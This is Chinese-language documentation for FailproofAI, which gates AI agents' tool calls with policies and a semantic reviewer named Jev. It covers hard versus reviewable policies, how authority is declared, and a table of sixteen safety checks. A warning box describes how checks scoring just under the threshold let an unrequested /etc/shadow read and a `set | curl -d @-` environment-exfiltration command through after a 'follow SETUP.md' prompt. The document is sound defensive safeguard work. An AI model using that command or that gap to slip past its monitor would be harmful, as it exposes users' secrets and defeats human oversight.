当您通过 FailproofAI Cloud 或自己的密钥配置 [Jev 策略审查](/zh/policies/jev) 时，每个受门控的工具调用都会由您运行的策略以及 Jev 进行判断——Jev 会询问该调用实际执行了什么操作，以及发出任务的用户是否请求了该操作。每个策略的**权限**决定了两者产生分歧时的处理方式。

未配置 Jev 时，权限设置不起任何作用。每个策略的执行方式与以往完全相同。

## 硬性与可审查

- **硬性（Hard）**是默认设置。硬性策略的拒绝或指令是最终决定：Jev 无法解除它，硬性拒绝会在不等待 Jev 的情况下直接阻止调用。
- **可审查（Reviewable）**意味着 Jev 可以解除策略的判决，但只能通过策略在 `reviewedBy` 中指定的语义检查来实现。只有当**所有**指定的检查都针对此调用进行了询问，且每个检查要么未发现任何问题，要么记录了用户对此的请求时，判决才会被解除。一个**触发**了——即发现了相关问题——但用户未请求的检查，即使其自身判决仅为警告，也会保持拦截。Jev 未被询问的检查（因为它不适用于该工具）无论其他检查结果如何，都不会解除任何拦截。满足以下任一条件即视为同意：当调用是用户交给代理的任务中的一个步骤，且未超出任务范围时，Jev 会将拒绝转为警告，该警告会解除策略的拦截，并作为反馈传达给代理。

策略仅在满足以下所有条件时才可审查：

1. 声明了 `authority: "reviewable"`。
2. `reviewedBy` 是一个非空列表，且每个条目都是已安装包声明的 Jev 检查。Failproof AI 本身不附带任何 Jev 检查：[下方的十六个检查](#semantic-policy-names)来自 `failproofai policies add FailproofAI/jev-policies`。如果没有包声明检查，所有策略均为硬性。
3. 不是 `alwaysOn`。阻止代理禁用 Failproof AI 的防护措施始终为硬性。

其他所有情况均为硬性：缺少字段、值拼写错误、`reviewedBy` 为空或格式错误，或者名称不是当前机器可以询问的检查。未知名称会使整个声明变为硬性，而不是被跳过，因为 `reviewedBy` 的含义是"所有这些都必须被询问，且没有一个可以拒绝"，跳过某个名称会让 Jev 以比您要求的更少的检查来解除策略。

一旦配置了 Jev，当 Failproof AI 拒绝一个 `reviewable` 声明时，每个进程会记录一次警告。未配置 Jev 时不会输出任何信息，因为此时权限设置不决定任何事情。`failproofai publish` 拒绝构建包含此类声明的包，因此包作者在任何人安装之前就能发现问题。它会根据包声明的检查来验证 `reviewedBy`（如果包声明了检查），否则根据十六个 `FailproofAI/jev-policies` 名称进行验证。

## 权限声明位置

策略到达机器的每种方式都有一个确定其权限的地方：

| 来源 | 声明位置 | 默认值 |
| --- | --- | --- |
| 内置策略 | 下表 | 除列为可审查外均为硬性 |
| 自定义策略文件 | `customPolicies.add` 上的 `authority` 和 `reviewedBy` | 硬性 |
| 策略包 | 包清单（`failproofai-pack.json`）中每个策略的条目 | 硬性 |
| 云管理策略 | 策略在活跃部署中的分配 | 硬性。部署目前尚未设置此项，因此今天所有云管理策略均为硬性。 |

对于包或云管理策略，策略代码内部设置的字段会被忽略；清单或分配决定权限。包只能描述自己的策略：其策略名称不能包含 `/`，并在包自己的前缀下注册，因此任何清单都无法将内置策略或其他包的策略标记为可审查。包代码注册但未在清单中声明的策略为硬性。

两个包，或两个云管理策略，如果其代码字节完全相同，则共享一个构件并作为一个策略加载。只有当其中每一个都声明为可审查时，该策略才是可审查的，并且 Jev 必须满足它们中任何一个命名的所有检查。如果其中任何一个声明为硬性，或根本未声明，则保持硬性。包或策略的列出顺序从不重要。

大多数机器从 `FailproofAI/policies` 包获取内置策略，并从该包的清单中读取其权限。下面的可审查条目在安装了包含这些条目的包版本后生效；较旧的版本不包含任何可审查条目，因此其中所有策略保持硬性。

## 在自定义策略中声明权限

```js
import { customPolicies, deny, allow } from "failproofai";

customPolicies.add({
  name: "block-prod-config-reads",
  description: "Keep production credentials out of the agent's context",
  match: { events: ["PreToolUse"] },
  authority: "reviewable",
  reviewedBy: ["secret-exposure"],
  fn: async (ctx) =>
    String(ctx.toolInput?.file_path ?? "").includes("/config/prod/")
      ? deny("Production config is off limits")
      : allow(),
});
```

`failproofai publish` 会将两个字段都复制到包清单中，因此作为包发布的策略会保留其作者赋予的权限。如果声明不会被执行，它会拒绝构建包：值不是 `"hard"` 或 `"reviewable"`、`reviewedBy` 不是名称列表，或者名称不是检查——如果包声明了检查则使用包自己的 [Jev 检查](/zh/policies/publish-a-pack#jev-checks-in-a-pack)，否则使用内置检查。

## 内置策略

仅在语义策略真正涵盖相同关注点时才可审查。所有其他内置策略均为硬性。

涵盖关注点是必要条件但非充分条件，且两种出错方式都是无声的：

- **从未被询问的检查**会使拦截永久生效。`reviewedBy` 是一个合取关系，从未被询问的检查永远不会解除拦截，因此与一个前提条件对该策略匹配的输入形状不会触发的检查配对的策略永远无法被解除。
- **被询问但未触发的检查**回答"无关注点"，而无关注点会解除拦截。因此，与一个不对您策略输入形状建模的检查配对，并不是在审查策略——而是对检查不理解的确切输入将其关闭。

instruct 模式的语义策略永远无法回答拒绝，但它仍然可以保持拦截：当它触发且用户未请求该调用时，它审查的策略不会被解除。`FailproofAI/jev-policies` 检查中有六个仅限 instruct 模式——`push-to-protected-branch`、`commit-on-protected-branch`、`read-outside-workspace`、`system-modification`、`env-secrets-dump` 和 `external-data-egress`——[下表](#semantic-policy-names)给出了每个检查的模式。需要问的问题是**"是否还有任何能够拒绝的内容"**：解除绝不能让关注点处于无任何执行的状态。引擎对每次调用应用该测试。没有人同意的警告不是解除，因为在工具调用之前，警告不会阻止代理。当一个*能够*拒绝的检查发出警告——其证据未达到拒绝阈值——且用户未请求该调用时，该调用上的任何内容都不会被解除，所有正则表达式拒绝照常生效。

<Warning>
**刚好低于触发阈值的检查不会保持底线。**上述规则需要检查*触发*（证据 ≥ 0.7）。当所有相关检查都刚好低于该阈值时，没有任何检查触发，审查者回答"无关注点"，可审查的拒绝会被解除。在强制执行模式下实测：对 `/etc/shadow` 的未请求读取（`secret-exposure` 0.69，`read-outside-workspace` 0.37，后者只对主目录路径建模）和在"follow SETUP.md"之后执行 `set | curl -d @- …`（`env-secrets-dump` 0.66，`credential-exfiltration` 0.65，其中 `sends_out` 0.97）均被允许，而单独的正则表达式层会拒绝它们。这些阈值是在标注语料库上校准的，尚未针对此情况重新测量；在重新测量之前，对于上述任一形状通过比其误拦截更重要的情况，请将策略保持为**硬性**。
</Warning>

## 语义策略名称

以下是 `FailproofAI/jev-policies` 声明的检查，以及安装后 `reviewedBy` 接受的值。Failproof AI 本身不附带其中任何一个：没有该包（或其他声明这些名称的包），任何命名它们的策略都不可审查。每个检查都是 Jev 针对当前工具调用进行回答的检查。**模式（Mode）**是检查能够回答的类型：`deny` 检查在证据充分时拦截，而 `instruct` 检查只会发出警告。两种模式在触发且用户未请求调用时，都会保持策略的拒绝状态。**用户可覆盖（User can override）**表示人类的明确请求是否可以解除它。

Jev 仅询问已安装包声明的 [Jev 检查](/zh/policies/publish-a-pack#jev-checks-in-a-pack)，这些也是 `reviewedBy` 接受的名称。两个包以不同方式声明同一名称时，两者都不会被执行。以下十六个名称中，由非 FailproofAI 仓库安装的包声明的名称会被忽略：其版本永远不会被询问，也不会与 FailproofAI 自己的版本竞争，因此第三方包既无法成为解除核心包策略的检查，也无法关闭这些检查之一。不可读的包列表，或每个检查都不可用的包，会让 Jev 没有任何内容可询问。

| 名称 | 模式 | 用户可覆盖 | Jev 检查的内容 |
| --- | --- | --- | --- |
| `destructive-deletion` | deny | 是 | 永久删除无法再生的数据。 |
| `production-infra-change` | deny | 是 | 更改生产基础设施。 |
| `git-history-rewrite` | deny | 是 | 重写或丢弃共享的 git 历史记录。 |
| `push-to-protected-branch` | instruct | 是 | 直接推送到受保护分支。 |
| `commit-on-protected-branch` | instruct | 是 | 直接在受保护分支上提交。 |
| `secret-exposure` | deny | 是 | 读取或复制凭据。 |
| `credential-exfiltration` | deny | 否 | 将密钥或私有文件发送到机器外部。 |
| `remote-code-execution` | deny | 是 | 运行从互联网下载的代码。 |
| `privilege-escalation` | deny | 是 | 以提升的权限运行。 |
| `database-destruction` | deny | 是 | 销毁或批量修改数据库数据。 |
| `read-outside-workspace` | instruct | 是 | 读取项目外的文件。 |
| `agent-config-tampering` | deny | 否 | 更改代理自身的安全配置。 |
| `system-modification` | instruct | 是 | 在项目外更改系统。 |
| `env-secrets-dump` | instruct | 是 | 打印环境密钥。 |
| `external-destructive-action` | deny | 是 | 通过外部工具执行不可逆操作。 |
| `external-data-egress` | instruct | 是 | 将私有数据发送到外部工具。 |
